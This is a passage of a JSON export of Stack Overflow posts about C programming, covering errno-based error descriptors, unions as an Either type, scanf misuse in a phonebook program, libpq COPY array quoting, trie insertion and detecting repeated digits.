envision.</p>\n\n<p>I personally do not care about the entire error trace, because in my experience, everything can be traced back to the initial error. (In other words, when something goes <em>b0rk</em>, a lot of other stuff tends to go <em>b0rk</em> too, with only the root <em>b0rk</em> being relevant.  Others may disagree, but in my experience, the cases when the entire trace is necessary is best catered by proper debugging tools, like stack traces and core dumps.)</p>\n\n<p>Let's say we implement a file open -like function (perhaps overloaded, so that it can not only read local files, but full URLs?), that takes a <code>errordesc *err</code> parameter, initialized to <code>ERRORDESC_INIT</code> by caller (so the pointers are NULL, line number is zero, and error numbers are zero).  In the case of a standard library function failing (thus <code>errno</code> is set), it would register the error thus:</p>\n\n<pre><code>        if (err &amp;&amp; !err-&gt;errnum) {\n            err-&gt;file = __FILE__;\n            err-&gt;func = __func__;\n            err-&gt;line = __LINE__;\n            err-&gt;errnum = errno;\n            err-&gt;suberr = /* error subtype number, or 0 */;\n        }\n        return (something that is not a valid return value);\n</code></pre>\n\n<p>Note how that stanza allows a caller to pass <code>NULL</code> if it really does not care about the error at all. (I am of the opinion that functions should make it easy for programmers to handle errors, but not try to enforce it: stupid programmers are more stupid than I can imagine, and will just do something even more stupid if I try to force them to do it in a less stupid fashion. Teaching rocks to jump is more rewarding, really.)</p>\n\n<p>Also, if the error structure is already populated (here, I am using <code>errnum</code> field as the key; it is zero only if the entire structure is in \"no error\" state), it is important to not overwrite the existing error description.  This ensures that a complex operation that spans several function calls, can use a single such error structure, and retain the root cause only.</p>\n\n<p>For programmer neatness, you can even write a preprocessor macro,</p>\n\n<pre><code>#define  ERRORDESC_SET(ptr, errnum_, suberr_)       \\\n            do {                                    \\\n                errordesc *const  ptr_ = (ptr);     \\\n                const int         err_ = (errnum_); \\\n                const int         sub_ = (suberr_); \\\n                if (ptr_ &amp;&amp; !ptr_-&gt;errnum) {        \\\n                    ptr_-&gt;file = __FILE__;          \\\n                    ptr_-&gt;func = __func__;          \\\n                    ptr_-&gt;line = __LINE__;          \\\n                    ptr_-&gt;errnum = err_;            \\\n                    ptr_-&gt;suberr = sub_;            \\\n                }                                   \\\n            } while(0)\n</code></pre>\n\n<p>so that in case of an error, a function that takes a parameter <code>errordesc *err</code>, needs just one line, <code>ERRORDESC_SET(err, errno, 0);</code> (replacing <code>0</code> by the suitable sub-error number), that takes care of updating the error structure.  (It is written to behave exactly like a function call, so it should not have any surprising behaviour, even if it is a preprocessor macro.)</p>\n\n<p>Of course, it also makes sense to implement a function that can report such errors to a specified stream, typically <code>stderr</code>:</p>\n\n<pre><code>void errordesc_report(errordesc *err, FILE *to)\n{\n    if (err &amp;&amp; err-&gt;errnum &amp;&amp; to) {\n        if (err-&gt;suberr)\n            fprintf(to, \"%s: line %u: %s(): %s (%d).\\n\",\n                err-&gt;file, err-&gt;line, err-&gt;func,\n                strerror(err-&gt;errnum), err-&gt;suberr);\n        else\n            fprintf(to, \"%s: line %u: %s(): %s.\\n\",\n                err-&gt;file, err-&gt;line, err-&gt;func, strerror(err-&gt;errnum));\n    }\n}\n</code></pre>\n\n<p>which produces error reports like <code>foo.c: line 55: my_malloc(): Cannot allocate memory.</code></p>\n"}], "owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 389, "favorite_count": 0, "accepted_answer_id": 53931245, "answer_count": 1, "score": 5, "last_activity_date": 1546953184, "creation_date": 1545821273, "last_edit_date": 1546953184, "question_id": 53930980, "link": "https://stackoverflow.com/questions/53930980/handle-errors-with-union", "title": "Handle errors with union", "body": "<p>I came to C from high-level <code>Scala</code> language and came up with a question. In Scala we usually handle error/exceptional conditions using <a href=\"https://scala-lang.org/api/2.12.0/scala/util/Either.html\" rel=\"nofollow noreferrer\">Either</a> which looks like the following:</p>\n\n<pre><code>sealed abstract class Either[+A, +B] extends Product with Serializable \n</code></pre>\n\n<p>So roughly speaking it presents a sum of types <code>A</code> and <code>B</code>. Either can contain only one instance (<code>A</code> either <code>B</code>) at any given time. By convention <code>A</code> is used for errors, <code>B</code> for the actual value.</p>\n\n<p>It looks very similar to <code>union</code>, but since I'm very new to <code>C</code> I'm not sure if it is sort of conventional to make use of unions for error handling.</p>\n\n<p>I'm inclined to do something like the following to handle the open file descriptor error:</p>\n\n<pre><code>enum type{\n    left,\n    right\n};\n\nunion file_descriptor{\n    const char* error_message;\n    int file_descriptor;\n};\n\nstruct either {\n    const enum type type;\n    const union file_descriptor fd;\n};\n\nstruct either opened_file;\nint fd = 1;\nif(fd == -1){\n    struct either tmp = {.type = left, .fd = {.error_message = \"Unable to open file descriptor. Reason: File not found\"}};\n    memcpy(&amp;opened_file, &amp;tmp, sizeof(tmp));\n} else {\n    struct either tmp = {.type = right, .fd = {.file_descriptor = fd}};\n    memcpy(&amp;opened_file, &amp;tmp, sizeof(tmp));\n}\n</code></pre>\n\n<p>But I'm not sure if this is the conventional C way.</p>\n"}, {"tags": ["c", "printf", "scanf"], "comments": [{"owner": {"reputation": 16020, "user_id": 9716597, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f97c613dca0b157b40551a0d756abeb?s=128&d=identicon&r=PG&f=1", "display_name": "L. F.", "link": "https://stackoverflow.com/users/9716597/l-f"}, "edited": false, "score": 0, "creation_date": 1545827161, "post_id": 53930965, "comment_id": 94704517, "body": "When we input strings using <code>scanf</code> with <code>%s</code>, we do not use <code>&amp;</code>. You can learn more <a href=\"https://en.cppreference.com/w/c/io/fscanf\" rel=\"nofollow noreferrer\">here</a>."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1545828884, "post_id": 53930965, "comment_id": 94705114, "body": "Did you really get the message &quot;There is a problem with scanf&quot;? Or did you actually get a way more specific error?"}, {"owner": {"reputation": 21, "user_id": 10834660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd459417f62a68680fbd71d7e60461a?s=128&d=identicon&r=PG&f=1", "display_name": "yasmine", "link": "https://stackoverflow.com/users/10834660/yasmine"}, "edited": false, "score": 0, "creation_date": 1545830889, "post_id": 53930965, "comment_id": 94705744, "body": "i didn&#39;t get it specified actually but when i removed the &amp; as you mentioned and i added contact input; as mentioned in another answer it worked without errors but i got this message that i couldn&#39;t under /usr/lib/gcc/x86_64-linux-gnu/5/../../../x86_64-linux-gnu/cr&zwnj;&#8203;t1.o: In function _start&#39;: (.text+0x20): undefined reference to main&#39; collect2: error: ld returned 1 exit status stand"}, {"owner": {"reputation": 21, "user_id": 10834660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd459417f62a68680fbd71d7e60461a?s=128&d=identicon&r=PG&f=1", "display_name": "yasmine", "link": "https://stackoverflow.com/users/10834660/yasmine"}, "edited": false, "score": 0, "creation_date": 1545830908, "post_id": 53930965, "comment_id": 94705751, "body": "i am using an online compiler by the way"}, {"owner": {"reputation": 21, "user_id": 10834660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd459417f62a68680fbd71d7e60461a?s=128&d=identicon&r=PG&f=1", "display_name": "yasmine", "link": "https://stackoverflow.com/users/10834660/yasmine"}, "edited": false, "score": 0, "creation_date": 1545834108, "post_id": 53930965, "comment_id": 94706842, "body": "it&#39; a part of the project"}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 10834660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd459417f62a68680fbd71d7e60461a?s=128&d=identicon&r=PG&f=1", "display_name": "yasmine", "link": "https://stackoverflow.com/users/10834660/yasmine"}, "edited": false, "score": 0, "creation_date": 1545828672, "post_id": 53930988, "comment_id": 94705039, "body": "everything is ok except this message which appeared   /usr/lib/gcc/x86_64-linux-gnu/5/../../../x86_64-linux-gnu/cr&zwnj;&#8203;t1.o: In function <code>_start&#39;: (.text+0x20): undefined reference to </code>main&#39; collect2: error: ld returned 1 exit status"}, {"owner": {"reputation": 374, "user_id": 9858322, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hUNcB.jpg?s=128&g=1", "display_name": "rsonx", "link": "https://stackoverflow.com/users/9858322/rsonx"}, "reply_to_user": {"reputation": 21, "user_id": 10834660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd459417f62a68680fbd71d7e60461a?s=128&d=identicon&r=PG&f=1", "display_name": "yasmine", "link": "https://stackoverflow.com/users/10834660/yasmine"}, "edited": false, "score": 1, "creation_date": 1545833335, "post_id": 53930988, "comment_id": 94706616, "body": "@yasmine You need to add a main function in your program."}], "tags": [], "owner": {"reputation": 12106, "user_id": 4431643, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CoZjt.jpg?s=128&g=1", "display_name": "kiran Biradar", "link": "https://stackoverflow.com/users/4431643/kiran-biradar"}, "is_accepted": true, "score": 2, "last_activity_date": 1545821310, "creation_date": 1545821310, "answer_id": 53930988, "question_id": 53930965, "link": "https://stackoverflow.com/questions/53930965/c-program-to-get-contact-from-user-and-add-it-to-a-file/53930988#53930988", "title": "C Program to get contact from user and add it to a file", "body": "<p>You are trying to read the input without declaring the variable for structure.</p>\n\n<pre><code>typedef struct{\n  char firstName [20];\n  char lastName[20];\n  int phoneNumber[10];\n  char email[50];\n  char address[100];\n  int dayOfBirth[2];\n  int monthOfBirth[2];\n  int yearOfBirth [4];\n}contact;\n\nscanf(\" %s\",&amp;contact.firstName);\n</code></pre>\n\n<p><code>contact</code> is datatype.\nYou need to declare the variable of type <code>contact</code>.</p>\n\n<p><strong>Example:</strong></p>\n\n<pre><code>contact input;\nscanf(\" %s\", input.firstName);\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 10834660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd459417f62a68680fbd71d7e60461a?s=128&d=identicon&r=PG&f=1", "display_name": "yasmine", "link": "https://stackoverflow.com/users/10834660/yasmine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 53930988, "answer_count": 1, "score": 1, "last_activity_date": 1545830828, "creation_date": 1545821170, "last_edit_date": 1545830828, "question_id": 53930965, "link": "https://stackoverflow.com/questions/53930965/c-program-to-get-contact-from-user-and-add-it-to-a-file", "title": "C Program to get contact from user and add it to a file", "body": "<p>I wrote this code to get input from user and add it to a file. When I ran this code on an online compiler, I got a message informing me that there is a problem with the call to the <code>scanf</code> function. I'm not able to understand this problem. Would you please help me to solve this issue?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\ntypedef struct {\n    char firstName   [20];\n    char lastName    [20];\n    int  phoneNumber [10];\n    char email       [50];\n    char address     [100];\n    int  dayOfBirth  [2];\n    int  monthOfBirth[2];\n    int  yearOfBirth [4];\n} contact;\n\nvoid addcontact() {\n    FILE *p,*q;\n    p = fopen(\"p.txt\", \"r+\");\n    printf(\" please enter the first name\");\n    scanf(\" %s\", &amp;contact.firstName);\n    printf(\" next, enter the last name\");\n    scanf(\" %s\", &amp;contact.lastName);\n    printf(\" enter the phone number\");\n    scanf(\" %d\", &amp;contact.phoneNumber);\n    printf(\" enter the email\");\n    scanf(\" %s\", &amp;contact.email);\n    printf(\" enter the address\");\n    scanf(\" %s\", &amp;contact.address);\n    printf(\" enter the day , month and year of birth\");\n    scanf(\" %d %d %d\", &amp;contact.dayOfBirth, &amp;contact.monthOfBirth, &amp;contact.yearOfBirth);\n    q = fclose(p);\n}\n</code></pre>\n\n<p>I even tried to remove the <code>&amp;</code>.</p>\n\n<p>PS: The project is a phone book.</p>\n"}, {"tags": ["c", "postgresql", "libpq"], "answers": [{"tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": true, "score": 1, "last_activity_date": 1545820795, "creation_date": 1545820795, "answer_id": 53930887, "question_id": 53930596, "link": "https://stackoverflow.com/questions/53930596/how-can-i-insert-multi-entry-array-using-libpg-copy-from-stdin-method-in-pos/53930887#53930887", "title": "How can I insert multi-entry array using [libpg] &quot;COPY FROM STDIN&quot; method in PostgreSQL?", "body": "<p>See the <a href=\"https://www.postgresql.org/docs/11/sql-copy.html\" rel=\"nofollow noreferrer\">PostgreSQL docs</a>. The default format for COPY is not CSV but text. If you change to CSV, <em>then</em> you can bracket a cell with quotes, the default quote being <code>\"</code>.</p>\n\n<p>Hence, try</p>\n\n<pre><code>COPY TestTable FROM STDIN with delimiter ',' CSV\n</code></pre>\n\n<p>with double quotes around columns with <code>,</code>:</p>\n\n<pre><code>buffer[]=\"1,7.4,\\\"{1.5,2.3}\\\"\\n\" \n</code></pre>\n"}], "owner": {"reputation": 559, "user_id": 8205705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0d5f01e46b412bc7966fad14bf216a1?s=128&d=identicon&r=PG&f=1", "display_name": "Shore", "link": "https://stackoverflow.com/users/8205705/shore"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 214, "favorite_count": 0, "accepted_answer_id": 53930887, "answer_count": 1, "score": 0, "last_activity_date": 1545826040, "creation_date": 1545819297, "last_edit_date": 1545826040, "question_id": 53930596, "link": "https://stackoverflow.com/questions/53930596/how-can-i-insert-multi-entry-array-using-libpg-copy-from-stdin-method-in-pos", "title": "How can I insert multi-entry array using [libpg] &quot;COPY FROM STDIN&quot; method in PostgreSQL?", "body": "<p>I am using libpq to insert bulk data from a C program.</p>\n\n<p>The bulk data contain data type that is double array, which in PostgreSQL is float8[].</p>\n\n<p>My platform is Windows 10, PostgreSQL 11.</p>\n\n<p>The tested table is structured as follows:</p>\n\n<pre><code>create table TestTable(\n    a  int4,\n    b  float8,\n    c  float8[]\n)\n</code></pre>\n\n<p>The C code is as follow:</p>\n\n<pre><code>void OutputRes(int i)\n{\n    int         Status;\n    char        sql[SQLLEN]= \"COPY TestTable FROM STDIN with(delimiter ',');\";\n    PGconn     *conn = NULL;\n    PGresult   *res;\n    char buffer[] = \"1,7.4,'{1.5}'\\n\";\n\n    conn = PQconnectdb(CONNSTR);\n    if (PQstatus(conn) != CONNECTION_OK) {\n         printf(\"Connection failed: %s\", PQerrorMessage(conn));\n    }\n\n    res = PQexec(conn, \"COPY TestTable FROM STDIN with(delimiter ',');\");\n    if (PQresultStatus(res) != PGRES_COPY_IN) {\n        printf(\"Not in COPY_IN mode\\n\");\n    }\n    PQclear(res);\n    Status = PQputCopyData(conn, buffer, strlen(buffer));\n    Status = PQputCopyData(conn, buffer, strlen(buffer));\n    Status = PQputCopyEnd(conn, NULL);\n\n    res = PQexec(conn, \"COMMIT;\");\n    if (PQresultStatus(res) != PGRES_COMMAND_OK) {\n        printf(\"BEGIN command failed: %s\", PQerrorMessage(conn));\n    }\n    PQclear(res);\n    PQfinish(conn);\n}\n</code></pre>\n\n<p>While \"buffer\" variable contains the data to be inserted.</p>\n\n<p>The insertion succeedes if it is structured as follow:</p>\n\n<pre><code>buffer[]=\"1,7.4,{1.5}\\n\"\n</code></pre>\n\n<p>But if I would try to insert multiple entries in the array, the insertion doesn't work and no error message.</p>\n\n<pre><code>buffer[]=\"1,7.4,{1.5,2.3}\\n\"\n</code></pre>\n\n<p>Furthermore I tried the following, both failed.</p>\n\n<pre><code>buffer[]=\"1,7.4,\\\"{1.5,2.3}\\\"\\n\" \nbuffer[]=\"1,7.4,'{1.5,2.3}'\\n\"\n</code></pre>\n\n<p>Can someone help me on this?</p>\n"}, {"tags": ["c", "function", "pointers", "struct", "trie"], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 10834442, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a007161b296f97e90d453369c2f4eab2?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/10834442/john-doe"}, "edited": false, "score": 0, "creation_date": 1545818490, "post_id": 53930362, "comment_id": 94701511, "body": "Thank you so much! I just tried it and it worked... I just realized that I overlooked the fact that I never actually created such a struct."}], "tags": [], "owner": {"reputation": 751, "user_id": 5552166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8941926688c6212b73aa67cbb2c70428?s=128&d=identicon&r=PG&f=1", "display_name": "hessam hedieh", "link": "https://stackoverflow.com/users/5552166/hessam-hedieh"}, "is_accepted": true, "score": 0, "last_activity_date": 1545818173, "creation_date": 1545818173, "answer_id": 53930362, "question_id": 53930197, "link": "https://stackoverflow.com/questions/53930197/modifying-a-c-structs-children-with-a-function-for-the-application-of-a-trie/53930362#53930362", "title": "Modifying a C struct&#39;s children with a function (for the application of a trie)", "body": "<p>if you dont initialize the structure <code>node</code> the <code>insert</code> is not going to do that for you with magic, the problem of your code (at least the snippet you post) is you never create any instance of struct <code>node</code> so <code>root</code> is and going to be forever <code>null</code>,<br>\nHere is a demo code shows you how to assign struct fields in a function  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n/***struct defenition***/\ntypedef struct demo_t\n{\n    int foo;\n    int bar;\n}demo_t;\n/***Function to change values***/\nvoid insert(demo_t *demo)\n{\n    demo-&gt;foo = 1;\n    demo-&gt;bar = 2;\n}\n/***main***/\nint main()\n{\n    //create instance of struct\n    demo_t demo;\n    demo.foo = 0;\n    demo.bar = 0;\n    //pass the reference\n    insert(&amp;demo);\n    //verify\n    printf(\"foo = %d    bar = %d\\r\\n\", demo.foo, demo.bar);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 10834442, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a007161b296f97e90d453369c2f4eab2?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/10834442/john-doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 53930362, "answer_count": 1, "score": 1, "last_activity_date": 1545818173, "creation_date": 1545817323, "question_id": 53930197, "link": "https://stackoverflow.com/questions/53930197/modifying-a-c-structs-children-with-a-function-for-the-application-of-a-trie", "title": "Modifying a C struct&#39;s children with a function (for the application of a trie)", "body": "<p>I'm trying to create a trie in C, to load a dictionary into a trie, right now, but I am having trouble with modifying the struct.</p>\n\n<p>I have a function that produces a blank node, right now, and that seems to be working fine. The main function scans through the dictionary file, and calls an \"insert\" function, as follows:</p>\n\n<pre><code>while (ftell(inptr) &lt; endIndex)\n{\n    fscanf(inptr,\"%[^\\n]\", word);\n    printf(\"%s\\n\", word);\n\n    //main insert function\n    insert(word, root);\n\n\n    //skips past this word\n    fseek(inptr, 1, SEEK_CUR);\n}\n</code></pre>\n\n<p>This is immediately proceeded by a test in which I try to determine the value of a boolean in the \"A\" value of the trie.</p>\n\n<pre><code>printf(\"%i\\n\", (int)(root -&gt; ptr[0] -&gt; isEnd));\n</code></pre>\n\n<p>But that yields an error, because root's pointer is apparently null (member access within null pointer of type 'struct node').</p>\n\n<p>The implementation of the function <code>insert</code> is as follows.</p>\n\n<pre><code>bool insert(char *word, struct node *root)\n{\n    if (strcmp(word, \"\") == 0)\n    {\n        for (int i = 0, size = 27; i &lt; size; i++)\n        {\n            root -&gt; ptr[i] = NULL;\n        }\n        root -&gt; isEnd = true;\n        return false;\n    }\n    else\n    {\n        //gets the first letter of the word\n        char firstLetter = word[0];\n\n        //figures out which place in the array it goes\n        int firstLetterInt;\n        if (isalpha(firstLetter))\n        {\n            firstLetterInt = firstLetter - 'a';\n        }\n        else\n        {\n            firstLetterInt = 26;\n        }\n\n        //gets the rest of the word\n        char *subbuff = calloc(45,1);;\n        memcpy(subbuff, &amp;word[1], strlen(word) - 1);\n        subbuff[strlen(word)] = '\\0';\n\n        if(!(root -&gt; ptr[firstLetterInt]))\n        {\n            root -&gt; ptr[firstLetterInt] = blankNode();\n        }\n\n        insert(subbuff, root -&gt; ptr[firstLetterInt]);\n        free(subbuff);\n        return true;\n    }\n}\n</code></pre>\n\n<p>I understand that I should be using pointers and the like, but I've played around with that and I can't seem to get it to work. I even tried to pass the nodes in as <code>struct node **root</code>, but the same issue seemed to appear. Another strange thing is that during the while loop, they seem to recognize the insertions, because when \"caterpillar\" is inserted, the \"c\", \"a\", and \"t\" are not created as new nodes.</p>\n"}, {"tags": ["c", "for-loop", "digits"], "comments": [{"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "edited": false, "score": 0, "creation_date": 1545817114, "post_id": 53930076, "comment_id": 94701017, "body": "Very unclear what your code tries to do... or how it fails ... or what you found debugging it. Why would not you just count how often each digit shows up by building frequncy table of 10 elements and then check if you got anything above 1 in the table?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545817122, "post_id": 53930076, "comment_id": 94701024, "body": "PLease elaborate &quot;it doesn&#39;t work&quot;. Give examples of input and output."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "edited": false, "score": 0, "creation_date": 1545817146, "post_id": 53930076, "comment_id": 94701039, "body": "@AlexeiLevenkov No arrays."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545817223, "post_id": 53930076, "comment_id": 94701066, "body": "Please demonstrate the failure with a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> an (un-)suitable input."}, {"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545817267, "post_id": 53930076, "comment_id": 94701087, "body": "@Yunnosch  Would you think using bit flags for counter work for OP?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "edited": false, "score": 1, "creation_date": 1545817334, "post_id": 53930076, "comment_id": 94701111, "body": "@AlexeiLevenkov Bitflags would probably mean bending the no-array rule. I would not dare handing that in."}, {"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545817603, "post_id": 53930076, "comment_id": 94701196, "body": "More trolling (since @Yunnosch is probably right that bit flags would cheat on &quot;no array&quot; rule): I think recursion would actually be easier to write for code you are trying: <code>last_digit_repeated(n) { &#47;*check if last digit repeated*&#47; || last_digit_repeated(n&#47;10)</code>"}], "answers": [{"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": true, "score": 0, "last_activity_date": 1545820164, "last_edit_date": 1545820164, "creation_date": 1545818887, "answer_id": 53930500, "question_id": 53930076, "link": "https://stackoverflow.com/questions/53930076/turn-the-flag-on-when-the-digits-shows-twice-in-a-number-c/53930500#53930500", "title": "Turn the flag on when the digits shows twice in a number - C", "body": "<p>You take the least significant digit and check if it is present in the rest of the number. If it is found, you're done. If it is not found, you divide the number by 10 and repeat the process. Example:</p>\n\n<pre><code> n = 123456789;\n step 1: Is 9 present in 12345678\n step 2: Is 8 present in 1234567\n step 3: Is 7 present in 123456\n .. and so on ..\n</code></pre>\n\n<p>So first you write a function that can tell whether a number contains a specific digit. The function could look like:</p>\n\n<pre><code>int contains_digit(int number, int digit)\n{\n  while(number)\n  {\n    if ((number % 10) == digit) return 0;  // Return zero when found\n    number /= 10;\n  }\n  return 1; // Return one if not found\n}\n</code></pre>\n\n<p>Then you call that function for all digits in the original number and tests the digit to the number divided by 10. For instance if the number is 1234, you call the function like:</p>\n\n<pre><code>contains_digit(123, 4)\ncontains_digit(12, 3)\ncontains_digit(1, 2)\n</code></pre>\n\n<p>That can be something like:</p>\n\n<pre><code>int main( void )\n{\n  int n = 12434;\n  int flag = 1;\n  while(n &amp;&amp; flag)\n  {\n    flag = contains_digit(n/10, n % 10);\n    n /= 10;\n  }\n\n  printf(\"flag is %d\\n\", flag);\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 10620363, "user_type": "registered", "profile_image": "https://graph.facebook.com/1872867342750737/picture?type=large", "display_name": "Lidor Cohen", "link": "https://stackoverflow.com/users/10620363/lidor-cohen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 1, "accepted_answer_id": 53930500, "answer_count": 1, "score": 0, "last_activity_date": 1545820164, "creation_date": 1545816739, "question_id": 53930076, "link": "https://stackoverflow.com/questions/53930076/turn-the-flag-on-when-the-digits-shows-twice-in-a-number-c", "title": "Turn the flag on when the digits shows twice in a number - C", "body": "<p>Without using an array.. How can I manage to turn a flag from 1 to 0 if there is the same digit twice or more in a number?</p>\n\n<p><strong>take it as if they are all integers, the temp &amp; temp2 are the same number which is a 4 digit number</strong></p>\n\n<pre><code>for(i = 0; i &lt; 4; i++) //if a digits shows twice\n{\n    n = temp % 10;\n    for(k = 0; k &lt;= 6; k++)\n    {\n        if(n == temp2 % 10)\n        {\n            counter++;\n        }\n        temp2 /= 10;\n    }\n    temp /= 10;\n    if(counter &gt; 1)\n    {\n        flag = 0;\n    }\n    counter = 0;\n}\n</code></pre>\n\n<p>The result is that just it doesn't work.. something is not working</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1545814616, "post_id": 53929678, "comment_id": 94700122, "body": "You need to check what <code>scanf</code> <a href=\"https://en.cppreference.com/w/c/io/fscanf#Return_value\" rel=\"nofollow noreferrer\"><b><i>returns</i></b></a>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1545814725, "post_id": 53929678, "comment_id": 94700147, "body": "And please mind your indentation. Right now it looks like the <code>switch</code> statement is outside the <code>if</code>. Also consider using <code>{}</code> to surround larger blocks of code inside statements. Both these things will make the code much easier to read and understand."}, {"owner": {"reputation": 87, "user_id": 10834294, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-x3dwTZhrE1I/AAAAAAAAAAI/AAAAAAAAAVY/YKApPbNRyIU/photo.jpg?sz=128", "display_name": "Alejandro Rosales", "link": "https://stackoverflow.com/users/10834294/alejandro-rosales"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": 